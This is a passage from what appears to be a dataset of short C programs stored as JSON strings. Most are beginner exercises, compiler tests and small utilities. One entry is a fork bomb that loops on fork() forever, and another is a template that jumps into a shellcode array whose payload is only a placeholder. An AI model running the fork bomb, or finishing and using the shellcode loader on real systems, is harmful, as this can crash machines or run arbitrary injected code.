    "#include <stdio.h>\nint main() {\n  double num1 = 0;\n  double num2 = 0;\n  double resultado = 0;\n  printf(\"Informe o valor do primeiro n\u00famero: \\n\");\n  scanf(\"%lf\", &num1);\n  printf(\"Informe outro n\u00famero: \\n\");\n  scanf(\"%lf\", &num2);\n  if (num2 == 0) {\n    do {\n      printf(\"N\u00famero inv\u00e1lido!\\n\");\n      printf(\"Informe outro n\u00famero:\\n\");\n      scanf(\"%lf\", &num2);\n      resultado = num1 / num2;\n    } while(num2 == 0);\n    printf(\"O resultado da divis\u00e3o do n\u00famero %.2f e %.2f \u00e9 %.2f.\\n\", num1, num2, resultado);\n  } else {\n    resultado = num1 / num2;\n    printf(\"O resultado da divis\u00e3o do n\u00famero %.2f e %.2f \u00e9 %.2f.\\n\", num1, num2, resultado);\n  }\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(){\n int a,b,c;\n scanf(\"%d %d %d\",&a,&b,&c);\n double sum = 0;\n for(int i=1;i<=a;i++){\n  sum += i;\n }\n for(int i=1;i<=b;i++){\n  sum += pow(i,2);\n }\n for(int i=1;i<=c;i++){\n  sum += pow(i,-1);\n }\n printf(\"%.2f\",sum);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <ctype.h>\nint arrayMax(int * array, int n) {\n  int * a = array;\n  int * s = array;\n  int i;\n  for (i = 0 ; i < n-1 ; i++){\n    if (*a < *(array+i+1)){\n     a = array+i+1;\n  }\n  }\n  return (a-s);\n}\nint counting_decipher(FILE * f){\n  int c;\n  int alphabet_array[26]={0};\n  while ((c = fgetc(f)) != (-1)) {\n     if ((0 ? isalpha(c) : (((unsigned)(c)|32)-'a') < 26)) {\n   c = tolower(c);\n   c -= 'a';\n   alphabet_array[c] += 1;\n     }\n }\n int the_key_to_decipher;\n the_key_to_decipher = arrayMax(alphabet_array,26);\n int key;\n key = the_key_to_decipher + 'a' - 'e';\n if (key < 0){\n  key += 26;\n }\n return key;\n}\nint main(int argc, char ** argv) {\n if (argc != 2) {\n  fprintf((stderr),\"No inputFileName!\\n\");\n  return 1;\n }\n int key;\n FILE * f = fopen(argv[1], \"r\");\n if (f == ((void*)0)) {\n  perror(\"Could not open file\");\n  return 1;\n }\n key = counting_decipher(f);\n printf(\"%d\\n\",key);\n if (fclose(f) != 0) {\n  perror(\"Failed to close the input file!\");\n  return 1;\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n return 0;\n}",
    "int main() { return 0; }\nvoid crosscall2(void(*fn)(void*, int, long unsigned int), void *a, int c, long unsigned int ctxt) { }\nlong unsigned int _cgo_wait_runtime_init_done() { return 0; }\nvoid _cgo_release_context(long unsigned int ctxt) { }\nchar* _cgo_topofstack(void) { return (char*)0; }\nvoid _cgo_allocate(void *a, int c) { }\nvoid _cgo_panic(void *a, int c) { }\nvoid _cgo_reginit(void) { }\nint _cgoexp_973df858ea43_SayHello_in_go;",
    "int main()\n{\n  int i, j, x, y;\n  if (y<0) {\n    x = 1;\n  } else {\n    x = 2;\n  }\n  i=0;\n  while (i<10) {\n    if (x<0) {\n      j+=2;\n    } else {\n      j++;\n    }\n    i++;\n  }\n  return 0;\n}",
    "#include <stdio.h>\n\nint main(void)\n{\n printf(\"helloworld\");\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[]){\n    int a, b;\n    if(&a > &b)\n        printf(\"Endereco da variavel A: %d\\n\",&a);\n    else\n        printf(\"Endereco da variavel B: %d\\n\", &b);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n int age = 20;\n int height=60;\n printf(\"I am %d years old.\\n\",age);\n printf(\"I am %d inches tall.\\n\", height);\n return 0;\n}",
    "#include <stdio.h>\n#include <malloc.h>\nint main()\n{\n int a, n;\n int i = 1;\n int sum = 0;\n scanf(\"%d\" ,&n);\n while (i<=n)\n {\n scanf(\"%d\", &a);\n sum = sum + (a-i);\n i++;\n }\n printf(\"%d\",sum);\n}",
    "#include <stdio.h>\n#include <string.h>\nint main()\n{\n    char str[100] = \"Hello\";\n    int len = 0;\n    fgets(str, sizeof(str), (stdin));\n    len = strlen(str);\n    int k = len;\n    while(k)\n    {\n        for (int i = k - 1; i < len; i++)\n        {\n            printf(\"%c\", str[i]);\n        }\n        k--;\n        if (k == 0)\n        {\n            break;\n        }\n        printf(\"  \");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\nfloat compute_GPA(char grades[], int n) {\n float total = 0.0;\n for (int i = 0; i < n; i++) {\n  switch (tolower(grades[i])) {\n   case 'a':\n    total += 4.0;\n    break;\n   case 'b':\n    total += 3.0;\n    break;\n   case 'c':\n    total += 2.0;\n    break;\n   case 'd':\n    total += 1.0;\n    break;\n   case 'f':\n    break;\n  }\n }\n return total / n;\n}\nint main() {\n char grades[] = {'A', 'A', 'c'};\n float gpa = compute_GPA(grades, 3);\n printf(\"%f\", gpa);\n return 0;\n}\ndouble triangle_area(double base, double height) {\n double product = base * height;\n return product / 2;\n}",
    "#include <stdio.h>\nvoid visualizza_array(double media_righe[100], int m);\nvoid leggi_da_tastiera2D(int a[][100], int m, int n );\nvoid media_array2D(int a[][100], int m, int n,double media_righe[]);\nint main()\n{\n    int n,m,a[100][100];\n    double media_righe[100];\n    printf(\"Inserisci il numero di righe (<=100):\\n\");\n    scanf(\"%d\", &m);\n    printf(\"Inserisci il numero di colonne (<=100):\\n\");\n    scanf(\"%d\", &n);\n    leggi_da_tastiera2D( a, m, n );\n    media_array2D(a, m, n,media_righe);\n    visualizza_array(media_righe,m);\n}\nvoid media_array2D(int a[][100], int m, int n, double media_righe[])\n{\n    int i,j;\n    double somma=0.0;\n    for(i=0;i<m;i++){\n        somma=0.0;\n        for(j=0;j<n;j++)\n        {\n            somma=somma+ a[i][j];\n        }\n    media_righe[i]=somma/n;\n    }\n}\nvoid leggi_da_tastiera2D(int a[][100], int m, int n)\n{\n    int i,j;\n    printf(\"\\nInserisci gli elementi di una matrice\\n\");\n    for(i=0;i<m;i++)\n        for (j=0;j<n;j++)\n        {\n            printf(\"dammi l'elemento A[%d][%d]-->\", i,j);\n            scanf(\"%d\", &a[i][j]);\n        }\n}\nvoid visualizza_array(double media_righe[], int m)\n{\n    int i;\n        for(i=0;i<m;i++)\n        {\n            printf(\"il numero %d-esimo \u00e8 %lf\\n\", i,media_righe[i]);\n        }\n        printf(\"\\n\");\n}",
    "char shellcode[] =\n\"<code_here>\";\nint main(int argc, char **argv)\n{\n  int (*funct)();\n  funct = (int (*)()) shellcode;\n  (int)(*funct)();\n}",
    "#include <stdio.h>\nint main(void) {\n int i,j;\n int A[128][128];\n int B[128][128];\n for(i=0;i<128;i++) {\n  for(j=0;j<128;j++) {\n   A[i][j] = i+j;\n   B[i][j] = 999;\n  }\n }\n#pragma scop\n {\n#pragma species kernel A[0:127,0:127]|element -> B[0:127,0:127]|element\n  for (i = 0; i < 128; i++) {\n   for (j = i; j < 128; j++) {\n    B[i][j] = 2 * A[i][j];\n   }\n  }\n#pragma species endkernel example11_k1\n }\n#pragma endscop\n fflush((stdout));\n return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint cmpDec(const void *a, const void *b)\n{\n    return *(int *)b - *(int *)a;\n}\nint main()\n{\n    int n;int i;int k;int m;\n    scanf(\"%d\",&n);\n    int s[n];\n    for (i=0;i<n;i++)\n        {\n            scanf(\"%d\",&s[i]);\n        }\n    scanf(\"%d\",&k);\n    int ans;\n    qsort(s, n, sizeof(int), cmpDec);\n    for (i=0,ans=1;ans<k;i++)\n    {\n        if (s[i]>s[i+1]) ans++;\n    }\n    int times=1;int det =s[i];\n    for (;det==s[i];i++,times++)\n    ;\n    printf(\"%d %d\",det,times-1);\n    return 0;\n}",
    "#include <unistd.h>\nint main(void) {\n    for (;;) {\n        (void) fork();\n    }\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n    float veloc, tempo;\n    scanf(\"%f\\n%f\", &tempo, &veloc);\n    printf(\"%.3f\\n\", tempo * veloc / 12);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int n, m;\n    int u, c;\n    printf(\"#balls and max-limit: \");\n    scanf(\"%d %d\", &n, &m);\n    printf(\"n: %d, m: %d\\n\", n, m);\n    while( n > 0){\n        printf(\"user: \");\n        scanf(\"%d\", &u);\n        n = n - u;\n        if (n == 0){\n            printf(\"computer: FAIL >>>>>>>>BALLS LEFT: %d\\n\", n);\n            printf(\"\\n>>>>>>>>NO<<<<<<<<<\\n\");\n            break;\n        }\n        c = n%(m+1);\n        if (c == 0) c = 1;\n        n = n - c;\n        printf(\"computer: %d >>>>>>>BALLS LEFT: %d\\n\", c, n);\n        if (n == 0)\n        {\n            printf(\"\\n>>>>>>>>YES<<<<<<<<<\\n\");\n            break;\n        }\n    }\n    return 0;\n}",
    "int main(){\n    int a,b;\n    a=1;b=2;\n}",
    "int main()\n{\n    return 1*2+3*4+5*6+7*8;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\nint main(void) {\n  printf(\"The process id is: %d\\n\", getpid());\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[]){\n  int ages[] = {23,55,15,34,78,12};\n  char *names[] = {\n    \"Feinb\", \"Fhilp\", \"Wastan\", \"Wustak\",\"Henris\",\"Abkar\"\n  };\n  int count = sizeof(ages) / sizeof(int);\n  int i = 0;\n  for(i = 0; i < count; i++){\n    printf(\"%s has lived for %d years.\\n\", names[i], ages[i]);\n  }\n  printf(\"---\\n\");\n  int *cur_age = ages;\n  char **cur_name = names;\n  for(i = 0; i < count; i++){\n    printf(\"%s is %d years old.\\n\",\n      *(cur_name+i), *(cur_age+i));\n  }\n  printf(\"---\\n\");\n  for(i = 0; i < count; i++){\n    printf(\"%s is still %d years old.\\n\",\n      cur_name[i], cur_age[i]);\n  }\n  printf(\"---\\n\");\n  for(cur_name = names, cur_age = ages;\n      (cur_age - ages) < count;\n        cur_name++, cur_age++){\n    printf(\"%s lived %d years so far.\\n\",\n      *cur_name, *cur_age);\n  }\n  return 0;\n}",
    "#include<stdio.h>\n\nint main(void)\n{\n int num = 888;\n float flo = 234.567f;\n unsigned long un_num = 3000000000;\n printf(\"This is your number: *%d*.\\n\", num);\n printf(\"This is your hexdecimal number: *%4x*.\\n\", num);\n printf(\"This is your float-point number: *%10.3f*.\\n\", flo);\n printf(\"And it's *%12.2e.*\\n\", flo);\n printf(\"This is a example string:\\n*%-30s*.\\n\", \"I'm a string.\");\n\n printf(\"This is an unsigned long integer with 15 width: *%15lu*.\\n\", un_num);\n printf(\"This is your hexdecimal number: *%#4x*.\\n\", num);\n printf(\"This is your float-point number: *%-12.2e*.\\n\", flo);\n printf(\"This is your float-point number: *%+10.3f*.\\n\", flo);\n printf(\"This is your string: *%8.8s*.\\n\", \"I'm a string.\");\n printf(\"A decimal has 6 width and at least 4 numbers: *%6.4d*.\\n\", num);\n printf(\"How do you like below octaldecimal width?\\n\");\n int width;\n scanf(\"%d\", &width);\n printf(\"This is your octaldecimal: *%*o*.\\n\", width, num);\n printf(\"My favorite character is *%2c*.\\n\", 'Z');\n printf(\"The float point width equals to its characters number: *%+.f*.\\n\", 3.13f);\n printf(\"A string with 7 width, left align and only first 5 characters: *%7.5s*.\\n\", \"I'm a string.\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int x,y,w,h;\n    int min;\n    scanf(\"%d %d %d %d\",&x,&y,&w,&h);\n    min=w-x;\n    if(h-y<min)\n        min=h-y;\n    if(x<min)\n        min=x;\n    if(y<min)\n        min=y;\n    printf(\"%d\",min);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    printf(\"Hi, there!\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid insertionSort(int *p,int n)\n{\n int i,j,key;\n for(i=0;i<n;i++)\n {\n  key=*(p+i);\n  j=i-1;\n  while(j>=0&&(*(p+j))>key)\n  {\n   *(p+j+1)=*(p+j);\n   j=j-1;\n  }\n  *(p+j+1)=key;\n }\n}\nint sockMerchant(int n,int* ar)\n{\n    int i,count=0;\n    insertionSort(ar,n);\n    for(i=0;i<n;i++)\n    {\n        if(*(ar+i)==*(ar+i+1))\n        {\n            count++;\n            i++;\n        }\n    }\n    return count;\n}\nint main() {\n    int n;\n    scanf(\"%i\", &n);\n    int *ar = malloc(sizeof(int) * n);\n    for(int ar_i = 0; ar_i < n; ar_i++){\n       scanf(\"%i\",&ar[ar_i]);\n    }\n    int result = sockMerchant(n, ar);\n    printf(\"%d\\n\", result);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char** argv) {\n    int i;\n    printf(\"argc: %d\\n\", argc);\n    for (i = 0; i < argc; ++i)\n        printf(\"argv[%d]: %s\\n\", i, argv[i]);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char* argv[])\n{\n    for (int i = 0; argv[i] != ((void*)0); ++i) {\n        printf(\"-> %s\\n\", argv[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n int test;\n int i,j,sum=0,day,ans,work,k=0;\n char arr[100];\n scanf (\"%d\",&test);\n for(i=0;i<test;i++){\n  scanf (\"%d %d\",&day,&ans);\n  sum = 0;\n  for (j=0;j<day;j++){\n   scanf (\"%d\",&arr[j]);\n   sum = sum + arr[j];\n  }\n  k=0;\n  while (1>0){\n   work = sum - ans;\n   sum = work;\n   if (work<0){\n    printf(\"%d\\n\",k+1);\n    break;\n   }\n   k = k + 1;\n  }\n }\n}",
    "#include <stdio.h>\nint TotalDeLeds(const char *str){\n    int i, contador = 0;\n    for(i = 0; str[i] != '\\0'; i++){\n        switch(str[i]){\n            case '8':\n                contador += 7;\n                break;\n            case '0':\n            case '9':\n            case '6':\n                contador += 6;\n                break;\n            case '2':\n            case '3':\n            case '5':\n                contador += 5;\n                break;\n            case '4':\n                contador += 4;\n                break;\n            case '7':\n                contador += 3;\n                break;\n            case '1':\n                contador += 2;\n                break;\n        }\n    }\n    return contador;\n}\nint main(){\n    int nTestes, total_de_leds;\n    char str[102];\n    scanf(\"%d%*c\", &nTestes);\n    while(nTestes--){\n        scanf(\"%s\", str);\n        total_de_leds = TotalDeLeds(str);\n        printf(\"%d leds\\n\", total_de_leds);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n    int seconds, minute, hour, days;\n    printf(\"Enter Seconds: \");\n    scanf(\"%d\", &seconds);\n    days = (seconds - (seconds % (60*60*24))) / (60*60*24);\n    seconds = (seconds % (60*60*24));\n    hour = (seconds - (seconds % (60*60))) / (60*60);\n    seconds = seconds % (60*60);\n    minute = (seconds - (seconds % 60)) / 60;\n    seconds = seconds % 60;\n    printf(\"\\n%d Days, %d Hours, %d Minutes and %d Seconds\\n\", days, hour, minute, seconds);\n    return 0;\n}",
    "int a, b, c = 1;\nint main ()\n{\n  for (; b < 1; b++)\n    ;\n  if (!(c * (a < 1)))\n    __builtin_abort ();\n  return 0;\n}",
    "#include<stdio.h>\n\nint front = -1, rear = -1, queue[100];\nvoid enqueue(int value)\n{\n    printf(\"\\n\\nEnqueuing.......\\n\");\n    if(rear == 100 -1)\n    {\n        printf(\"\\nERROR: Queue Overflow\");\n        return;\n    }\n    else if(front == -1)\n    {\n        front = 0;\n    }\n    queue[++rear] = value;\n    printf(\"\\nEnqueued........\\n\", front, rear);\n}\nvoid dequeue(void)\n{\n    printf(\"\\n\\nDequeuing.......\\n\");\n    if(rear == -1 && front == -1)\n    {\n        printf(\"\\nERROR: queue is empty\");\n        return;\n    }\n    else if(front == rear)\n    {\n        front = -1;\n        rear = -1;\n    }\n    else\n    front++ ;\n    printf(\"\\n\\nDequeued.......\\n\", front, rear);\n}\nvoid isEmpty(void)\n{\n    printf(\"\\n\\nChecking......\\n\");\n    if(front == -1 && rear == -1)\n    {\n        printf(\"\\nQueue is empty\");\n    }\n    else\n    printf(\"\\nQueue is not empty\");\n}\nvoid print(void)\n{\n    printf(\"\\n\\nPrinting.....\\nQueue is: \");\n    if(front == -1 && rear == -1)\n    {\n        printf(\"\\nERROR: queue is empty, nothing to print\");\n        return;\n    }\n    for(int i=rear; i>= front; i--)\n    {\n        printf(\"%d \", queue[i]);\n    }\n}\nint main(void)\n{\n    int option, value;\n    char choice = 'y';\n    while( choice == 'y')\n    {\n        printf(\"Options:-\\n1)Enqueue\\n2)Dequeue\\n3)isEmpty\\n4)Print\\n\");\n        printf(\"\\nChoose option:\");\n        scanf(\"%d\", &option);\n        switch( option )\n        {\n            case 1:\n            printf(\"\\nEnter the value to push into queue:\");\n            scanf(\"%d\", &value);\n            enqueue(value);\n            break;\n            case 2:\n            dequeue();\n            break;\n            case 3:\n            isEmpty();\n            break;\n            case 4:\n            print();\n            break;\n            default:\n            printf(\"\\nERROR:enter the correct option:)\");\n            break;\n        }\n        printf(\"\\n\\nDo you want to choose options again?? (y/n):\");\n        scanf(\" %c\", &choice);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int a=1;\n    unsigned int b=1;\n    printf(\"a=%d,b=%d\\n\",a,b);\n    int c=0xffffffff;\n    unsigned int d=0xffffffff;\n    printf(\"c=%d,d=%d\\n\",c,d);\n    printf(\"c=%u,d=%u\\n\",c,d);\n    printf(\"~c=%d\\n\",~c);\n    printf(\"~c=%u\\n\",~c);\n    printf(\"~d=%d\\n\",~d);\n    printf(\"~d=%u\\n\",~d);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint endswith(char *str, char element){\n if(str[strlen(str)-1] == element){\n  return 0;\n }\n return -1;\n}\nint main(void){\n char *str = \"hello worlo\";\n if(endswith(str, 'd') == 0){\n  printf(\"%s ends with 'd'\\n\", str);\n }\n else{\n  printf(\"%s doesn't end with 'd'\\n\", str);\n }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <ctype.h>\n#include <math.h>\n#include <string.h>\n#include <stdint.h>\n\n\n\nint main(int argc, char* argv[])\n{\n    char filename[sizeof(\"NNN.jpg\")], test[6];\n    uint8_t rawin[512] = { 0 };\n    int jpg_counter = 0, offset = 0*512;\n    int jpg_start = 0;\n    int soi = 0;\n    FILE* file = fopen(\"card.raw\", \"r\");\n    if (file == ((void*)0))\n    {\n        printf(\"Could not open %s.\\n\", \"card.raw\");\n        return 1;\n    }\n    fseek(file, offset, (0));\n    FILE* output = ((void*)0);\n    while ( fread(&rawin, 512, 1, file) == 1)\n    {\n        sprintf(test, \"%02x%02x%02x\", rawin[0], rawin[1], rawin[2]);\n        if ( strcmp(\"ffd8ff\", test) == 0 )\n        {\n            if (output)\n            {\n                fclose(output);\n                jpg_counter++;\n            }\n            sprintf(filename, \"%03d.jpg\", jpg_counter);\n            output = fopen(filename, \"w\");\n            if (output == ((void*)0))\n            {\n                printf(\"Could not open %s.\\n\", filename);\n                fclose (file);\n                return 2;\n            }\n            soi ++;\n            jpg_start = 1;\n        }\n        if (jpg_start)\n        {\n            fwrite(&rawin, 512 , 1, output);\n        }\n    }\n    fclose (output);\n    fclose (file);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int n,i,j,flag;\n printf(\"\\nEnter the no of elements : \");\n scanf(\"%d\",&n);\n int a[n];\n printf(\"\\nEnter the elements : \");\n for(i=0;i<n;i++)\n {\n  scanf(\"%d\",&a[i]);\n }\n for(i=0;i<n;i++)\n {\n    for(j=i;j<n;j++)\n    {\n       flag=0;\n       if(a[j]>a[i])\n       {\n          printf(\"\\n%d %d\",a[i],a[j]);\n          flag=1;\n          break;\n       }\n   }\n   if(flag!=1)\n   {\n      printf(\"\\n%d %d\",a[i],-1);\n   }\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main ( void )\n{\n   printf (\"start\\n\");\n   void *p = malloc (1024);\n   free (p);\n   printf (\"done\\n\");\n   return 0;\n}\nvoid *malloc ( size_t size )\n{\n  printf (\"malloc\\n\");\n  return ((void*)0);\n}\nvoid free (void *ptr)\n{\n  printf (\"free\\n\");\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main()\n{\n _Bool escape = 0;\n printf(\"Welcome to Multipurpose Project!\\n\\n\");\n printf(\"If you would like to input, press the required key, then press enter.\\n\\n\");\n printf(\"Now, please establish which multipurpose project you would like to use:\\n\");\n printf(\"C (C-Calculator)\\n\");\n printf(\"N (Cuboid News)\\n\");\n printf(\"W (The Game of War)\\n\");\n printf(\"M (Machine Learning)\\n\\n\");\n while(1)\n {\n  char input;\n  scanf(\"%c\", &input);\n  chdir(\"..\\\\\\\\..\");\n  if(input == 'C' || input == 'c')\n  {\n   printf(\"\\n\\n\");\n   (void)system(\"C_Calculator\\\\\\\\EXE\\\\\\\\C_Calculator.exe\");\n   return(0);\n  }\n  else if(input == 'N' || input == 'n')\n  {\n   (void)system(\"CuboidNews\\\\\\\\CuboidNews.exe\");\n   exit(0);\n  }\n  else if(input == 'W' || input == 'w')\n  {\n   (void)system(\"run1.bat\");\n   exit(0);\n  }\n  else if(input == 'M' || input == 'm')\n  {\n   (void)system(\"run2.bat\");\n   exit(0);\n  }\n }\n}",
    "#include <stdio.h>\n#include <string.h>\nint main() {\n  int array[] = {1, 2, 3};\n  printf(\"%lu\", strlen((char const *)array));\n  return 0;\n}",
    "#include <stdio.h>\n\n\nint main(void) {\n    const float rain[5][12] = {\n        {4.3,4.3,4.3,3.0,2.0,1.2,0.2,0.2,0.4,2.4,3.5,6.6},\n        {8.5,8.2,1.2,1.6,2.4,0.0,5.2,0.9,0.3,0.9,1.4,7.3},\n        {9.1,8.5,6.7,4.3,2.1,0.8,0.2,0.2,1.1,2.3,6.1,8.4},\n        {7.2,9.9,8.4,3.3,1.2,0.8,0.4,0.0,0.6,1.7,4.3,6.2},\n        {7.6,5.6,3.8,2.8,3.8,0.2,0.0,0.0,0.0,1.3,2.6,5.2}\n    };\n    const float (*pyear)[12] = rain;\n    const float *pmonth = *pyear;\n    float subtotal, total;\n    int year, month;\n    printf(\"YEAR\\tRAINFALL(inches)\\n\");\n    for (total = 0; pyear < rain + 5; pyear++) {\n        for (subtotal = 0; pmonth < *pyear + 12; pmonth++)\n            subtotal += *pmonth;\n        printf(\"%d\\t%.1f\\n\", pyear - rain + 2000, subtotal);\n        total += subtotal;\n    }\n    printf(\"\\nThe yearly average is %.1f inches.\\n\", total/5);\n    printf(\"MONTHLY AVERAGES:\\n\");\n    printf(\"Jan\\tFeb\\tMar\\tApr\\tMay\\tJun\\tJul\\tAug\\tSep\\tOct\\tNov\\tDec\\n\");\n    for (month = 0, pyear = rain; month < 12; month++) {\n        for (year = 0, total = 0; year < 5; year++)\n            total += *(*(pyear + year) + month);\n            printf(\"%.1f\\t\", total/5);\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n   FILE *fp;\n   fp = fopen(\".\\\\test\\\\test.txt\", \"w+\");\n   fprintf(fp, \"This is testing for fprintf...\\n\");\n   fputs(\"This is testing for fputs...\\n\", fp);\n   fclose(fp);\n   return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\nint main()\n{\n    double x1,y1,x2,y2,res1,fres;\n    scanf(\"%lf %lf\",&x1,&y1);\n    scanf(\"%lf %lf\",&x2,&y2);\n    res1=(x2-x1)*(x2-x1)+(y2-y1)*(y2-y1);\n    fres=sqrt(res1);\n    printf(\"%.4lf\\n\",fres);\n    return 0;\n}",
    "int x = 5;\nint main() {\n for(x = 0; x < 10 ; x = x + 1)\n  ;\n return x - 10;\n}",
    "#include<stdio.h>\n#include<locale.h>\n#include<string.h>\nint main () {\n setlocale(6, \"\");\n char name[30], biggerNameM[30], biggerNameF[30], gender[15];\n int cont = 0, age = 0;\n float sum=0, media = 0, bigger = 0, biggerWeight = 0, height = 0,\n       weight = 0;\n printf(\"Name: \");\n scanf(\"%s\", name);\n fflush((stdin));\n while ((strcmp(name, \"end\") != 0)) {\n  printf(\"Male(M) or Female(F): \");\n  scanf(\"%s\", gender);\n  printf(\"weight: \");\n  scanf(\"%f\", &weight);\n  printf(\"Height: \");\n  scanf(\"%f\", &height);\n  printf(\"Age: \");\n  scanf(\"%d\", &age);\n  fflush((stdin));\n  sum = sum + age;\n  if (age > 0) {\n   cont = cont + 1;\n   media = sum / cont;\n  }\n  if (strcmp(gender, \"m\") == 0) {\n   if (height > bigger) {\n    bigger = height;\n    strncpy(biggerNameM, name, 30);\n   }\n  }\n  if (strcmp(gender, \"f\") == 0) {\n   if (weight > biggerWeight) {\n    biggerWeight = weight;\n    strncpy(biggerNameF, name, 30);\n   }\n  }\n  printf(\"name: \");\n  scanf(\"%s\", name);\n }\n printf(\"Media: %.2f\\n\\n\", media);\n printf(\"Name height(MALE): %s\\n\\n\", biggerNameM);\n printf(\"Name Weight(FEMALE): %s\\n\", biggerNameF);\n return 0;\n}",
    "#include <stdio.h>\nint sum(int n);\nint main()\n{\n  printf(\"%d\\n\", sum(5) );\n  return 0;\n}\nint sum(int n)\n{\n  if (n > 0) return n + sum(n-1);\n  else return 0;\n}",
    "#include<stdio.h>\nint f(int x)\n{\n    if(x==2||x==3)\n        return 1;\n    else\n    {\n        for(int m=2;m<x/2;m++)\n            if(x%m==0)\n                return 0;\n        return 1;\n    }\n}\nint main()\n{\n    int n,i,j;\n    scanf(\"%d\",&n);\n    i=n+1;\nif(n==3)\n    {printf(\"5\");return 0;}\n    while(1)\n    {\n        if(f(i)==1)\n            {printf(\"%d\",i);\n            return 0;}\n        i++;\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <locale.h>\nint factorial_loop_for(int num)\n{\n    int factorial = 1;\n    for(factorial = 1; num > 1; num--){\n        factorial *= num;\n    }\n    return (factorial);\n}\nint factorial_loop_while(int num)\n{\n    int factorial = 1;\n    while(num >= 1){\n        factorial *= num;\n        --num;\n    }\n    return (factorial);\n}\nint main(){\n    setlocale(6, \"portuguese\");\n    int number, fat, op;\n    printf(\"Calculadora fatorial\");\n    printf(\"\\nDigite um valor a ser calculado: \");\n    scanf(\"%d\", &number);\n    printf(\"Digite 1 para calcular usando o for\\n\");\n    printf(\"Digite 2 para calcular usando o while\\n\");\n    scanf(\"%d\", &op);\n    switch (op)\n    {\n    case 1:\n        fat = factorial_loop_for(number);\n        break;\n    case 2:\n        fat = factorial_loop_while(number);\n        break;\n    default:\n        printf(\"Escolha inv\u00e1lida\\n\");\n        break;\n    }\n    printf(\"Resultado do fatorial: %d\\n\", fat);\n    return 0;\n}",
    "#include <stdio.h>\nint main ()\n{\n int v1, v2, v3;\n printf(\"introduza tr\u00eas valores inteiros: \");\n if (scanf(\"%d%d%d\", &v1, &v2, &v3) != 3) {\n  printf(\"ERRO: valores inv\u00e1lidos\\n\");\n  return 0;\n }\n int dif = 0;\n if (v1 != v2)\n  dif += 1;\n if (v2 != v3)\n  dif += 1;\n if (v1 != v3)\n  dif += 1;\n int par = 0;\n if (v1 % 2 == 0)\n  par += 1;\n if (v2 % 2== 0)\n  par += 1;\n if (v3 % 2== 0)\n  par += 1;\n int impar = 0;\n if (v1 % 2 != 0)\n  impar += 1;\n if (v2 % 2 != 0)\n  impar += 1;\n if (v3 % 2 != 0)\n  impar += 1;\n int men1, men2;\n if (v1 >= v2 && v1 >= v3) {\n  men1 = v2;\n  men2 = v3;\n }\n else if (v2 >= v1 && v2 >= v3) {\n  men1 = v1;\n  men2 = v3;\n }\n else if (v3 >= v1 && v3 >= v2) {\n  men1 = v1;\n  men2 = v2;\n }\n double media;\n media = (double)(v1 + v2 + v3)/3;\n printf(\"Diferentes: %d\\n\", dif);\n printf(\"Pares: %d\\n\", par);\n printf(\"\u00cdmpares: %d\\n\", impar);\n printf(\"Dois menores: %d %d\\n\", men1, men2);\n printf(\"M\u00e9dia: %.2lf\\n\", media);\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n   int year;\n   printf(\"Enter a year :\");\n   scanf(\"%d\", &year);\n   if (year % 4 == 0){\n      printf(\"%d is a leap year\", year);\n   }\n   else{\n      printf(\"%d is not a leap year\", year);\n   }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\nconst char* python = \"/usr/bin/python2.7\";\nconst char* bin = \"/Applications/Server.app/Contents/ServerRoot/Library/CalendarServer/bin\";\nconst char* site = \"/Applications/Server.app/Contents/ServerRoot/Library/CalendarServer/lib/python2.7/site-packages\";\nint prependToPath(const char* name, const char* prepend) {\n    const char* old_value = getenv(name);\n    char* new_value = ((void*)0);\n    if (old_value == ((void*)0)) {\n        size_t max_length = strlen(prepend) + 1;\n        new_value = malloc(max_length);\n        strlcpy(new_value, prepend, max_length);\n    } else {\n        size_t max_length = strlen(old_value) + strlen(prepend) + 2;\n        new_value = malloc(max_length);\n        strlcpy(new_value, prepend, max_length);\n        strlcat(new_value, \":\", max_length);\n        strlcat(new_value, old_value, max_length);\n    }\n    setenv(name, new_value, 1);\n    free(new_value);\n    return 0;\n}\nint main(int argc, const char * argv[]) {\n    prependToPath(\"PATH\", bin);\n    prependToPath(\"PYTHONPATH\", site);\n    argv[0] = python;\n    return execvp(python, (char* const*)argv);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main()\n{\n double a,b,c,d,f,s1,s2,s,p1,p2;\n scanf(\"%lf %lf %lf %lf %lf\",&a,&b,&c,&d,&f);\n p1=(d+f+c)/2;\n s1=p1*(p1-d)*(p1-f)*(p1-c);\n s1=sqrt(s1);\n p2=(a+b+f)/2;\n s2=p2*(p2-a)*(p2-b)*(p2-f);\n s2=sqrt(s2);\n s=s1+s2;\n printf(\"%.4lf\",s);\n return 0;\n}",
